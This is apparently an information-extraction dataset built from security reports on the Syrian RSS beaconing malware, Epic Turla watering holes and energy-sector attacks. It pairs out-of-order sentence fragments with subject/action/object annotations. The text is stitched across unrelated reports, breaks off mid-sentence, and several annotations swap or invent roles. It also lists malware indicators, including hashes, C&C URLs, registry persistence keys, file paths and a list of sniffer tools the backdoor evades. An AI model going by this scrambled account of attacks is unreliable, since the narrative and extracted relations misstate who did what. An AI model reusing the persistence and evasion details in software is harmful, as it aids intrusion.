Targeted Attacks Against the Energy Sector</header>\n\n\n<section>\n\n<heading>Spear phishing attacks in the energy sector</heading>\n    Spear phishing is, along with watering hole attacks, one of the most common attack vectors used to\n    attack companies": [{"used": {"A": "used", "S": "Spear phishing", "O": ["to attack companies"]}}], "\nOften small scripts or even manual commands are used to comb through local files and create network mappings": [{"are used": {"A": "are used", "O": ["to comb through local files and create network mappings", "Often small scripts or even manual commands"]}}], " Sometimes a regular off-the-shelf back door Trojan is used": [{"is used": {"A": "is used", "O": ["a regular off-the-shelf back door Trojan"]}}], "\n\n  Part of the malware code was signed with stolen digital certificates making it harder to detect by security tools": [{"making": {"A": "making", "S": "Part of the malware code was signed with stolen digital certificates", "O": ["it", "harder to detect by security tools"]}}], "\n</section>\n<section>\n  <heading>2008</heading>\n    In 2008, Tom Donahue, a senior Central Intelligence Agency (CIA) official told a meeting of utility company\n    representatives that cyberattacks had taken out power equipment in multiple cities outside the United States": [{"taken out": {"A": "taken out", "S": "cyberattacks", "O": ["power equipment in multiple cities outside the United States"]}}], " It is unknown if the attackers successfully retrieved the information\n    they were seeking, if they installed other back door Trojans or gained passwords that allowed them to directly\n    access the computers, or if they have given up on the target": [{"installed": {"A": "installed", "S": "they", "O": ["other back door Trojans"]}}], " These attacks can include nonspecific data\n    breaches where employee or customer records get stolen, as happened to the US Department of Energy in July\n    2013": [{"stolen": {"A": "stolen", "O": ["employee or customer records"]}}], " This is followed by the incursion phase of\n    breaking in and compromising computers": [{"breaking in and compromising": {"A": "breaking in and compromising", "O": ["computers"]}}], "\n\nFirst, the program nvidrv adds itself to autorun:\n<list>\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run under name \u201cUpdAdbreader\u201d\n</list>\n\fIt also creates a series of registry keys that the individual programs use to communicate:\n\nRegistry keys and programs using them:\n<list>\nrundl132.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K6F-DKV8J-FKVJI-\nGVKBU\\6nvisdvr.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K4F-DKV8J-FKVJI-\nGVKBU\\4GoogleUpate.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K3F-DKV8J-FKVJI-\nGVKBU\\3AdbrRader.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K2F-DKV8J-FKVJI-\nGVKBU\\2nvidrv.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K1F-DKV8J-FKVJI-GVKBU\\1\nSets name \u201c1\u201d to StartupInfo structure as a string, e.g": [{"using": {"A": "using", "S": "programs", "O": ["them"]}}, {"adds": {"A": "adds", "S": "the program nvidrv", "O": ["to autorun", "itself"]}}, {"creates": {"A": "creates", "S": "It", "O": ["a series of registry keys that the individual programs use to communicate"]}}, {}], "\n\nThe AdobeR1 file writes a series of executable files that perform information collection and communication functions,\nincluding:\n<list>\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\svhosts.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\n</list>\n</section>\n<section>\n<heading>Program Sequence</heading>\n\nThe program sequence of data collection and sending is somewhat unusual, with each program performing a single task\nand communicating via markers left in the registry": [{"perform": {"A": "perform", "S": "a series of executable files", "O": ["communication"]}}, {"left": {"A": "left", "O": ["in the registry", "markers"]}}, {"writes": {"A": "writes", "S": "The AdobeR1 file", "O": ["a series of executable files"]}}, {"is": {"A": "is", "S": "The program sequence of data collection and sending", "O": ["somewhat unusual"]}}], "\n\nFurther, because the malware sends data captured by the malware to an e-mail address, it does not require that the\nattackers maintain a command-and-control server online": [{"sends": {"A": "sends", "S": "the malware", "O": ["data captured by the malware", "to an e-mail address"]}}], " \u201c0x3110x611\u201d\n</list>\nIt then runs GooglUpd, which cleans up the program files if they exist, and runs AdbrRader": [{"cleans up": {"A": "cleans up", "S": "GooglUpd", "O": ["the program files", "if they exist"]}}, {"runs": {"A": "runs", "S": "It", "O": ["GooglUpd"]}}], "\n\nThis attack, which has little technical sophistication (i.e., it uses no exploits, code obfuscation, or techniques to frustrate\nreversing, etc.), nevertheless has carefully developed social engineering in the seeding materials and bait document": [{"developed": {"A": "developed", "S": "This attack", "O": ["in the seeding materials and bait document", "social engineering"]}}], "\n      Use of widely available RATs (njRAT, Xtreme Rat, ShadowTech Rat, DarkComet RAT, and Blackshades RAT, among\n      others)": [{"Use": {"A": "Use", "O": ["widely available RATs"]}}], " The function of\nthe malware appears to be: identify and unmask the IP address of target(s), and resend them to the attacker with each\nreboot": [{"resend": {"A": "resend", "S": "the malware", "O": ["to the attacker", "with each reboot", "them"]}, "identify and unmask": {"A": "identify and unmask", "S": "the malware", "O": ["the IP address of target(s)"]}}], " However, that malware had\nsubstantially more functionality than this case: not only did it drop a second stage from a compromised site, but was also\nincluded a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype": [{"exfiltrating": {"A": "exfiltrating", "S": "it", "O": ["credentials from Facebook and hooking programs like Skype"]}, "drop": {"A": "drop", "S": "it", "O": ["a second stage", "from a compromised site"]}}], "\n</section>\n<section>\n<heading>Warning: Social Engineering Thrives in Syrian Context</heading>\n\nThis attack was exceptionally targeted, and clearly reflected the work of an actor familiar with the operations of the\ntargeted organization": [{"was exceptionally targeted": {"A": "was exceptionally targeted", "O": ["This attack"]}}], " The\nmalware then sends an e-mail to the same inbox containing the text \u201cHello\u201d and with mxtd file attached": [{"sends": {"A": "sends", "S": "The malware", "O": ["an e-mail", "to the same inbox"]}}], "\n</section>\n<section>\n<heading>The Targeting of RSS</heading>\n\nThe unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address": [{"was sent": {"A": "was sent", "O": ["from a Gmail email address", "at the end of November 2014", "The unsolicited message below", "to RSS"]}}], "\nNevertheless, we believe that the author of the program is aware of certain techniques to reduce the visibility of malware\non a network, including transmitting data via encrypted e-mail communications": [{"transmitting": {"A": "transmitting", "O": ["via encrypted e-mail communications", "data"]}}, {"reduce": {"A": "reduce", "O": ["the visibility of malware on a network"]}}], "\n\nProgram \u201cAdobeIns.exe\u201d takes the files written by the other programs and zips them in an encrypted, password-\nprotected file:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\drv.sys\\mxtd\n</list>\n</section>\n<section>\n<heading>Data Transmission</heading>\n\nData is transmitted by e-mail to an account presumably controlled by the attacker": [{"is transmitted": {"A": "is transmitted", "O": ["by e-mail", "to an account presumably controlled by the attacker", "Data"]}}, {"zips": {"A": "zips", "S": "Program \u201cAdobeIns.exe\u201d", "O": ["them", "in an encrypted, password- protected file"]}}], "\n\nNext, \u201crundl132.exe\u201d performs an HTTP GET request to myexternalip.com and collects the external IP of the infected\nmachine:\n<list>\nGET /raw HTTP/1.1\nHost: myexternalip.com\nCache-Control: no-cacheHTTP/1.1 200 OK\nServer: nginx/1.6.2\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: close\nDate: [REDACTED]\nMy-External-Ip: [REDACTED]f\n\f[REDACTED]0\n</list>\nNext, rundl132 writes:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\Q7B90TFG\\raw[1].txt\n</list>\nThen rundl132 writes the external IP to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\n</list>\nFinally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder": [{"zips": {"A": "zips", "S": "AdobeIns", "O": ["the contents of the win32.tmp folder"]}}, {"performs": {"A": "performs", "S": "\u201crundl132.exe\u201d", "O": ["an HTTP GET request", "to myexternalip.com"]}, "collects": {"A": "collects", "S": "\u201crundl132.exe\u201d", "O": ["the external IP of the infected machine"]}}, {"writes": {"A": "writes", "S": "rundl132", "O": ["the external IP"]}}, {"runs": {"A": "runs", "S": "rundl132", "O": ["AdobeIns"]}}], " The malware resends the information each time\nthe computer is restarted, but it does not refresh the sent information on restart (which may be a bug)": [{"resends": {"A": "resends", "S": "The malware", "O": ["the information", "each time the computer is restarted"]}}], "\n</section>\n<section>\n<heading>Analyzing the Attack</heading>\n\nThis section describes a highly targeted attack sent to an e-mail address belonging to RSS": [{"sent": {"A": "sent", "O": ["a highly targeted attack", "to an e-mail address belonging to RSS"]}}], "\n\nAdobeIns connects to an account at the online e-mail provider inbox.com via smtp using hardcoded credentials": [{"connects": {"A": "connects", "S": "AdobeIns", "O": ["using hardcoded credentials", "via smtp", "to an account", "at the online e-mail provider inbox.com"]}}], " It registered only 6/55 detections by anti virus scanners, or a 10% detection rate": [{"registered": {"A": "registered", "S": "It", "O": ["only 6/55 detections by anti virus scanners, or a 10% detection rate"]}}], " In addition, data is sent to an Internet e-mail address, and no crypter is used to obscure the binary": [{"is sent": {"A": "is sent", "O": ["to an Internet e-mail address", "data"]}}], "\nIt then runs rundl132 if it has not before, by checking whether registry key name \u201c6\u201d is present": [{"checking": {"A": "checking", "S": "It", "O": ["whether registry key name \u201c6\u201d is present"]}, "runs": {"A": "runs", "S": "It", "O": ["if it has not before", "rundl132"]}}], "\n\nExamples of images in the slideshow as follows:\n<figure></figure>\n<figure></figure>\n<figure></figure>\n</section>\n<section>\n\f\f<heading>Infection and Data Collection</heading>\n\nWhen opened, the \u201cslideshow.zip\u201d file writes and executes several files:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\AdobeR1.exe C:\\Users\\\n[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\pictures.exe\n</list>\n\u201cAdobeR1.exe\u201d is malicious, while \u201cpictures.exe\u201d is the genuine slideshow displayed to the victim": [{"executes": {"A": "executes", "S": "the \u201cslideshow.zip\u201d file", "O": ["several files", "When writes several files"]}, "writes": {"A": "writes", "S": "the \u201cslideshow.zip\u201d file", "O": ["When opened", "several files executes When opened"]}}], "\n\nThe malware is also interesting because it does not provide remote access, but only sends an e-mail containing\nthe victim\u2019s IP address and miscellaneous system information": [{"sends": {"A": "sends", "S": "The malware", "O": ["an e-mail containing the victim\u2019s IP address and miscellaneous system information"]}}], "\nThe malware transmits autonomously, leaving the material in an inbox for the attacker to collect at a later time": [{"transmits": {"A": "transmits", "S": "The malware"}, "leaving": {"A": "leaving", "S": "The malware", "O": ["for the attacker to collect at a later time", "the material", "in an inbox"]}}], " The system information could be used to\nidentify processes to exploit in the future, however since the attacker has already triggered the execution of a file on the\nvictim\u2019s system, it is surprising that more was not taken, or that a RAT (custom or widely available) was not used": [{"triggered": {"A": "triggered", "S": "the attacker", "O": ["the execution of a file on the victim\u2019s system"]}}], " A RAT\nwould have provided much greater access alongside IP information\n\nBy not providing remote access and other RAT functionality, the program looks less like malware, and may attract less\nattention from endpoint protection tools and scanners": [{"attract": {"A": "attract", "S": "the program", "O": ["less attention"]}, "looks": {"A": "looks", "S": "the program", "O": ["less like malware"]}}], " The file\ncontained custom malware that profiled the victim\u2019s computer and beaconed its IP address to an e-mail\naccount under the attacker\u2019s control": [{"profiled": {"A": "profiled", "S": "custom malware", "O": ["the victim\u2019s computer"]}, "beaconed": {"A": "beaconed", "S": "custom malware", "O": ["to an e-mail account under the attacker\u2019s control", "its IP address"]}}], " That incident, observed in 2012, also used hardcoded e-mail to exfiltrate": [{"used": {"A": "used", "O": ["hardcoded e-mail", "to exfiltrate"]}}], "\n</section>\n<section>\n<heading>Analyzing the Malware</heading>\n\nThe custom malware used in this attack infects a user who views the decoy \u201cslideshow,\u201d and beacons home with the IP\naddress of the victim\u2019s computer and details about his or her system each time the computer restarts": [{"beacons": {"A": "beacons", "S": "The custom malware used in this attack", "O": ["each time the computer restarts", "home", "with details about his or her system"]}, "infects": {"A": "infects", "S": "The custom malware used in this attack", "O": ["a user who views the decoy \u201cslideshow,\u201d"]}}], " Although targeted, the malware seeding\n      often aims at classes of people (e.g., people interested in \u2018shocking\u2019 news about a fighter, or \u2018leaked\u2019 information\n      about the Assad regime) rather than carefully written spear phishing targeting a single individual or small group": [{"aims": {"A": "aims", "S": "the malware seeding", "O": ["at classes of people"]}}], " It sets the key to \u201c0\u201d and\nruns it": [{"sets": {"A": "sets", "S": "It", "O": ["to \u201c0\u201d", "the key"]}, "runs": {"A": "runs", "S": "It", "O": ["it"]}}], " For example:\n\n      The malware beacons location but does not provide RAT functionality": [{"beacons": {"A": "beacons", "S": "The malware", "O": ["location"]}}], "\n      The malware exfiltrates to an online e-mail account, thus not requiring the attacker to maintain a command-and-\n      control server online": [{"exfiltrates": {"A": "exfiltrates", "S": "The malware", "O": ["to an online e-mail account"]}}], "\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\ vgadmysadm.tmp\n</list>\nNext, nvidrv runs GoogleUpate, which collects system information and writes it to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vg2sxoysinf.tmp\n</list>\nThen nvidrv runs nvisdvr (registry key \u201c4\u201d) that collects a list of running processes, which are written to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\v2cgplst.tmp\n</list>\nFinally, nvidrv runs svhosts, which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com": [{"runs": {"A": "runs", "S": "nvidrv", "O": ["svhosts"]}}, {"doing": {"A": "doing", "S": "svhosts", "O": ["a DNS query for windowsupdate.microsoft.com"]}, "tests": {"A": "tests", "S": "svhosts", "O": ["Internet connectivity"]}}], "\n      At least one command-and-control server located within Syrian IP space (often from a limited range of addresses)": [{"located": {"A": "located", "S": "At least one command-and-control server", "O": ["within Syrian IP space"]}}], "\n250 2.0.0 Ok: queued as [REDACTED]\nQUIT\n221 2.0.0 Bye\n</list>\n</section>\n<section>\n<heading>Evaluation of the Malware\u2019s Functionality</heading>\n\nThe malware seen in this case study is unusual as it relies on a half-dozen separate executable files, each with a\nsingle task, and each communicating via markers dropped in the Registry": [{"dropped": {"A": "dropped", "O": ["markers", "in the Registry"]}}], "\n\nIn addition, the malware uses the old PKWARE implementation of zip encryption, which is not particularly secure": [{"uses": {"A": "uses", "S": "the malware", "O": ["the old PKWARE implementation of zip encryption"]}}], " When the slideshow is\nclosed both AdobeR1.exe and pictures.exe are deleted": [{"are deleted": {"A": "are deleted", "O": ["When the slideshow is closed", "both AdobeR1.exe and pictures.exe"]}}], "\n\nUnlike Syrian regime-linked malware, it contains no Remote Access Trojan (RAT) functionality,\nsuggesting it is intended for identifying and locating a target": [{"identifying and locating": {"A": "identifying and locating", "S": "it", "O": ["a target"]}}], " AdbrRader\n(communicating through registry key \u201c2\u201d) writes the file vgadmysadm.tmp with the name of another registry key \u201c2\u201d with\nstartup info": [{"writes": {"A": "writes", "S": "AdbrRader", "O": ["the file vgadmysadm.tmp with the name of another registry key \u201c2\u201d", "with startup info"]}}], "\n\nTransmitting the malware via e-mail also provides a degree of obscurity, and has the additional advantage of providing a\nlayer of abstraction between the attacker and the target: there is no need to maintain a RAT command-and-control server": [{"Transmitting": {"A": "Transmitting", "O": ["the malware", "via e-mail"]}}], " Not only is it\nexceptionally targeted, but it is also not a commonly available RAT": [{"is": {"A": "is", "S": "it", "O": ["exceptionally targeted"]}}], "\n      Use of \u201ccrypters\u201d to obscure the binary": [{"Use": {"A": "Use", "O": ["to obscure the binary", "\u201ccrypters\u201d"]}}], "\n      The seeding attempts to obtain a \u2018private\u2019 Facebook identity from RSS through social engineering": [{"obtain": {"A": "obtain", "S": "The seeding", "O": ["a \u2018private\u2019 Facebook identity"]}}], " However, we note that the attacker also attempts to social\nengineer the identity of individuals working with RSS, by requesting a personal Facebook page": [{"social engineer": {"A": "social engineer", "S": "the attacker", "O": ["the identity of individuals working with RSS"]}}], "\n\nThe attack took the form of an unsolicited e-mail containing a download link to a decoy file": [{"took": {"A": "took", "S": "The attack", "O": ["the form of an unsolicited e-mail containing a download link to a decoy file"]}}], "\n\fWe are aware of only one previous case in Syria in which e-mail was used to transmit data, and that we believed was\nregime linked": [{"was used": {"A": "was used", "O": ["e-mail", "to transmit data"]}}], " This behaviour\nstrongly suggests that the function of this malware is to serve as a beacon": [{"serve": {"A": "serve", "S": "this malware", "O": ["as a beacon"]}}], " For instance,\nanother tool often uploaded by the attackers to the victim's machine is \"winrs.exe\":\n<list>\n\fName: winrs.exe\nMD5: 1369fee289fe7798a02cde100a5e91d8\n</list>\nThis is an UPX packed binary, which contains the genuine \"dnsquery.exe\" tool from Microsoft, unpacked\nMD5: c0c03b71684eb0545ef9182f5f9928ca": [{"uploaded": {"A": "uploaded", "S": "the attackers", "O": ["to the victim's machine", "another tool"]}}, {}], "\n\nThe CVE-2013-5065 exploit allows the backdoor to achieve administrator privileges on the system and run\nunrestricted": [{"achieve": {"A": "achieve", "S": "the backdoor", "O": ["administrator privileges on the system"]}, "run": {"A": "run", "S": "the backdoor", "O": ["unrestricted"]}}], " The primary backdoor used in the Epic attacks is also known as\n\"WorldCupSec\", \"TadjMakhal\", \"Wipbot\" or \"Tavdig\"": [{"used": {"A": "used", "O": ["in the Epic attacks", "The primary backdoor"]}}], " The replies are sent back to the\nC&C through the same channel": [{"are sent": {"A": "are sent", "O": ["The replies", "back to the C&C", "through the same channel"]}}], " We have\nlocated several versions of this script which attempt various exploitation mechanisms": [{"attempt": {"A": "attempt", "S": "several versions of this script", "O": ["various exploitation mechanisms"]}}], " The backdoor extracted from the Java exploits has the following C&C hardcoded inside:\n<list>\nwww.arshinmalalan[.]com/themes/v6/templates/css/in.php\n</list>\nThis C&C is still online at the moment although it redirects to a currently suspended page at\n\"hxxp://busandcoachdirectory.com[.]au\"": [{"has": {"A": "has", "S": "The backdoor extracted from the Java exploits", "O": ["the following C&C"]}}], "\n\nThe huge network commanded by the Epic Turla attackers serves multiple purposes": [{"commanded": {"A": "commanded", "S": "the Epic Turla attackers", "O": ["The huge network"]}}], " The mothership also work as the exploitation servers\nused in the watering hole attacks, delivering Java, IE or fake applications to the victim": [{"used": {"A": "used", "S": "the exploitation servers", "O": ["in the watering hole attacks"]}}, {"delivering": {"A": "delivering", "S": "The mothership", "O": ["Java, IE or fake applications", "to the victim"]}, "work": {"A": "work", "S": "The mothership", "O": ["as the exploitation servers"]}}], " This takes advantage of social engineering to trick the user into running a fake\nFlash Player (MD5: 030f5fdb78bfc1ce7b459d3cc2cf1877):\n\n<figure></figure>\n\n\nIn at least one case, they tried to trick the user into downloading and running a fake Microsoft Security\nEssentials app (MD5: 89b0f1a3a667e5cd43f5670e12dba411):\n<figure></figure>\n\fThe fake application is signed by a valid digital certificate from Sysprint AG:\n<list>\nSerial number: 00 c0 a3 9e 33 ec 8b ea 47 72 de 4b dc b7 49 bb 95 Thumbprint: 24 21 58 64 f1 28 97 2b 26\n22 17 2d ee 62 82 46 07 99 ca 46\n</list>\n\n\n<figure></figure>\n<caption>Valid signature from Sysprint AG on Epic dropper</caption>\n\fThis file was distributed from the Ministry of Foreign Affairs of Tajikistan's website, at\n\"hxxp://mfa[.]tj/upload/security.php\"": [{"takes": {"A": "takes", "O": ["social engineering", "advantage"]}}, {"was distributed": {"A": "was distributed", "O": ["at \"hxxp://mfa[.]tj/upload/security.php\"", "from the Ministry of Foreign Affairs of Tajikistan's website", "This file"]}}, {"trick": {"A": "trick", "O": ["into running a fake Flash Player", "the user"]}}, {"trick": {"A": "trick", "S": "they", "O": ["into downloading and running a fake Microsoft Security Essentials app", "the user"]}}], " The communication protocol uses\n\n<figure></figure>\nrequests in the C&C replies, which the malware decrypts and processes": [{"decrypts and processes": {"A": "decrypts and processes", "S": "the malware", "O": ["the C&C replies"]}, "uses": {"A": "uses", "S": "The communication protocol", "O": ["in the C&C replies", "requests"]}}], "\nThe configuration can also be updated on the fly by the attackers, via the C&C": [{"be updated": {"A": "be updated", "S": "the attackers", "O": ["The configuration", "via the C&C"]}}], " Here's a look at one of the encrypted server\nreplies:\n<figure></figure>\n\fOnce a victim is infected and \"checks in\" with the server, the attackers send a template of commands:\n\n<figure></figure>\n\n\nNext, the attackers try to move through the victim's network using pre-defined or collected passwords:\n<figure></figure>\n\fListing all .doc files recursively is also a common \"theme\":\n\n<figure></figure>\n\n\nIn total, we have decoded several hundreds of these command packages delivered to the victims, providing\nan unique insight into the inner workings of the attackers": [{"send": {"A": "send", "S": "the attackers", "O": ["a template of commands"]}}, {"move": {"A": "move", "S": "the attackers", "O": ["using pre-defined or collected passwords", "through the victim's network"]}}, {"\"checks in\"": {"A": "\"checks in\"", "S": "a victim", "O": ["with the server"]}}, {"is infected": {"A": "is infected", "O": ["a victim"]}}], "\n</section>\n<section>\n<heading>The Epic command-and-control infrastructure</heading>\n\nThe Epic backdoors are commanded by a huge network of hacked servers that deliver command and\ncontrol functionality": [{"are commanded": {"A": "are commanded", "S": "a huge network of hacked servers", "O": ["The Epic backdoors"]}, "deliver": {"A": "deliver", "S": "a huge network of hacked servers", "O": ["command and control functionality"]}}], "\n\n<figure></figure>\n</section>\n<section>\n\n<heading>Lateral movement and upgrade to more sophisticated backdoors</heading>\n\nOnce a victim is compromised, the attackers upload several tools that are used for lateral movement": [{"upload": {"A": "upload", "S": "the attackers", "O": ["several tools that are used for lateral movement"]}}, {"is compromised": {"A": "is compromised", "O": ["a victim"]}}], "\n</section>\n<section>\n<heading>Victim statistics</heading>\n\fOn some of the C&C servers used in the Epic attacks, we were able to identify detailed victim statistics,\nwhich were saved for debugging purposes by the attackers": [{"were saved": {"A": "were saved", "S": "the attackers", "O": ["detailed victim statistics", "for debugging purposes"]}}], " If the\nvictim is interesting, they get upgraded to the Turla Carbon system": [{"upgraded": {"A": "upgraded", "O": ["to the Turla Carbon system", "they"]}}], "\n\nAnother more recent version attempts to exploit Oracle Sun Java and Adobe Flash Player:\n\n\n<figure></figure>\n\n<caption>Java and Flash Player exploitation scripts</caption>\n\nAlthough the Flash Player exploits couldn't be retrieved, we did manage to obtain the Java exploits:\n<table>\n                      Name               MD5\n                      allj.html          536eca0defc14eff0a38b64c74e03c79\n                      allj.jar           f41077c4734ef27dec41c89223136cf8\n                      allj64.html        15060a4b998d8e288589d31ccd230f86\n                      allj64.jar         e481f5ea90d684e5986e70e6338539b4\n                      lstj.jar           21cbc17b28126b88b954b3b123958b46\n                      lstj.html          acae4a875cd160c015adfdea57bd62c4\n</table>\n\fThe Java files exploit a popular vulnerability, CVE-2012-1723, in various configurations": [{"exploit": {"A": "exploit", "S": "The Java files", "O": ["a popular vulnerability", "in various configurations"]}}, {"exploit": {"A": "exploit", "S": "Another more recent version", "O": ["Oracle Sun Java and Adobe Flash Player"]}}, {}], " For instance, the\nmotherships function as both exploitation sites and command and control panels for the malware": [{"function": {"A": "function", "O": ["as exploitation sites", "the motherships"]}}], "\n\nThe payload dropped by these Java exploits is the following:\n<list>\nMD5: d7ca9cf72753df7392bfeea834bcf992\n</list>\nThe Java exploit use a special loader that attempts to inject the final Epic backdoor payload into\nexplorer.exe": [{"use": {"A": "use", "S": "The Java exploit", "O": ["a special loader"]}}, {"dropped": {"A": "dropped", "S": "Java exploits", "O": ["The payload"]}}, {"inject": {"A": "inject", "S": "a special loader", "O": ["into explorer.exe", "the final Epic backdoor payload"]}}], "\n\nThis is an Epic backdoor which connects to the following C&Cs, with a generic internal ID of 1156fd22-\n3443-4344-c4ffff:\n<list>\nhxxp://homaxcompany[.]com/components/com_sitemap/\nhxxp://www.hadilotfi[.]com/wp-content/themes/profile/\n</list>\nA full list with all the C&C server URLs that we recovered from the samples can be found in the technical\nAppendix": [{"connects": {"A": "connects", "S": "an Epic backdoor", "O": ["to the following C&Cs", "with a generic internal ID of 1156fd22- 3443-4344-c4ffff"]}}, {"is": {"A": "is", "S": "This", "O": ["an Epic backdoor"]}}], " This is used to gain a foothold and validate the high profile victim": [{"validate": {"A": "validate", "S": "This", "O": ["the high profile victim"]}}], "\n\nThe file is a .NET application that contains an encrypted resource": [{"contains": {"A": "contains", "S": "The file", "O": ["an encrypted resource"]}}], "\n\nThe backdoor attempts to identify the following processes and, if found, it will terminate itself:\n<list>\n      tcpdump.exe\n      windump.exe\n      ethereal.exe\n      wireshark.exe\n      ettercap.exe\n      snoop.exe\n      dsniff.exe\n</list>\nIt contains an internal unique ID, which is used to identify the victim to the C&C": [{"identify": {"A": "identify", "S": "an internal unique ID", "O": ["the victim", "to the C&C"]}}, {"terminate": {"A": "terminate", "S": "it", "O": ["itself"]}}, {"identify": {"A": "identify", "S": "The backdoor", "O": ["the following processes"]}}], "\n\nThrough monitoring, we were able to capture a large amount of commands sent to the victims by the\nattackers, providing an unique view into this operation": [{"sent": {"A": "sent", "S": "the attackers", "O": ["a large amount of commands", "to the victims"]}}], "\n\nHere's how the big picture looks like:\n<figure></figure>\n\f<caption>Epic Turla lifecycle</caption>\n\nThe first level of command and control proxies generally talk to a second level of proxies, which in turn,\ntalk to the \"mothership\" server": [{"talk": {"A": "talk", "S": "a second level of proxies", "O": ["to the \"mothership\" server"]}}, {"talk": {"A": "talk", "S": "The first level of command and control proxies", "O": ["to a second level of proxies"]}}], "\n<list>\nSize: 275,968 bytes\nMD5: e9580b6b13822090db018c320e80865f\nCompiled: Thu Nov 08 11:05:35 2012\n\nanother example:\n\nSize: 218,112 bytes\nMD5: 071d3b60ebec2095165b6879e41211f2\nCompiled: Thu Nov 08 11:04:39 2012\n</list>\nThis backdoor is more sophisticated and belongs to the next level of cyber-espionage tools called the\n\"Carbon system\" or Cobra by the Turla attackers": [{"called": {"A": "called", "S": "the Turla attackers", "O": ["This backdoor"]}}, {}], "\n\nDuring the first C&C call, the backdoor sends a pack with the victim's system information": [{"sends": {"A": "sends", "S": "the backdoor", "O": ["During the first C&C call", "a pack with the victim's system information"]}}], " In time, as\nthe attackers gain confidence, this is upgraded to more sophisticated backdoors, such as the\nCarbon/Cobra system": [{"is upgraded": {"A": "is upgraded", "O": ["to more sophisticated backdoors", "this"]}}], "\n</section>\n<section>\n<heading>The watering hole attacks</heading>\n\nCurrently, the Epic attackers run a vast network of watering holes that target visitors with surgical\nprecision": [{"target": {"A": "target", "S": "a vast network of watering holes", "O": ["visitors", "with surgical precision"]}}, {"run": {"A": "run", "S": "the Epic attackers", "O": ["a vast network of watering holes"]}}], "\n\nFor some of the C&C servers, the attackers implemented RSA encryption for the C&C logs, which makes it\nimpossible to decrypt them": [{"implemented": {"A": "implemented", "S": "the attackers", "O": ["for the C&C logs", "RSA encryption"]}}], " The mothership server is generally a VPS, which runs the Control panel\nsoftware used to interact with the victims": [{"interact": {"A": "interact", "S": "the Control panel software", "O": ["with the victims"]}}, {"runs": {"A": "runs", "S": "The mothership server", "O": ["the Control panel software"]}}], " In this case, we found they targeted two\n\franges belonging to:\n<list>\n      \"Country A\" - Federal Government Network\n      \"Country B\" - Government Telecommunications and Informatics Services Network\n</list>\nIt should be noted though, the fact that the attackers were targeting these ranges doesn't necessarily mean\nthey also got infected": [{"targeted": {"A": "targeted", "S": "they", "O": ["two ranges"]}}], "\n\nThere are other indications that the attackers are not native English language speakers:\n<list>\n      Password it\u00b4s wrong!\n      Count successful more MAX\n      File is not exists\n      File is exists for edit\n</list>\nThe sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an\nupgraded backdoor, has the compilation code page language set to \"LANG_RUSSIAN\"": [{"was delivered": {"A": "was delivered", "O": ["The sample e9580b6b13822090db018c320e80865f", "to several Epic victims", "as an upgraded backdoor"]}}], " Once a victim is confirmed as \"interesting\", the\nattackers upload another Epic backdoor which has a unique ID used to control this specific victim": [{"upload": {"A": "upload", "S": "the attackers", "O": ["another Epic backdoor"]}, "is confirmed": {"A": "is confirmed", "S": "the attackers", "O": ["a victim", "as \"interesting\""]}}, {"control": {"A": "control", "S": "another Epic backdoor", "O": ["this specific victim"]}}], " Sometimes, the attackers register the\n.JPG extension with the PHP handler on the server, using \"JPG\" files to run PHP scripts:\n\n\n\n<figure></figure>\n<caption>Profiling script</caption>\n\nThe main exploitation script \"wreq.php\", \"main.php\" or \"main.jpg\" performs a numbers of tasks": [{"using": {"A": "using", "S": "the attackers", "O": ["\"JPG\" files", "to run PHP scripts"]}}], "\n\nIt runs a control panel which is password protected:\n\n<figure></figure>\n\n\n<caption>Epic mothership control panel login</caption>\n\nOnce logged into the Control panel, the attackers can see a general overview of the system including the\nnumber of interesting potential targets:\n\n\n<figure></figure>\n\n<caption>Epic control panel status overview</caption>\n\nA very interesting file on the servers is task.css, where the attackers define the IP ranges they are\ninterested in": [{"define": {"A": "define", "S": "the attackers", "O": ["the IP ranges they are interested in"]}}], " Most recently, we observed them using yet another technique coupled with\nwatering hole attacks": [{"using": {"A": "using", "S": "them", "O": ["yet another technique 